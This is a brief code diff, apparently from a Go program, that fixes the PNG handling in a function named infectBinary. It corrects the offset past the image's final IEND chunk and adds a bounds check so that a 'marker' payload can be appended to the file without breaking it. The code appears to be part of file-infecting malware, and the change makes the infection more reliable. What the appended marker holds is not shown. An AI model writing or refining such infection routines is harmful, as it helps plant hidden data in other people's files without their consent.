@@ -137,7 +137,8 @@ func infectBinary(path string) {
 	switch ext {
 	case ".png":
 		if idx := strings.LastIndex(string(data), "IEND"); idx >= 0 {
-			pos := idx + 12
+			pos := idx + 8
+			if pos > len(data) { break }
 			newData := make([]byte, pos)
 			copy(newData, data[:pos])
 			newData = append(newData, marker...)
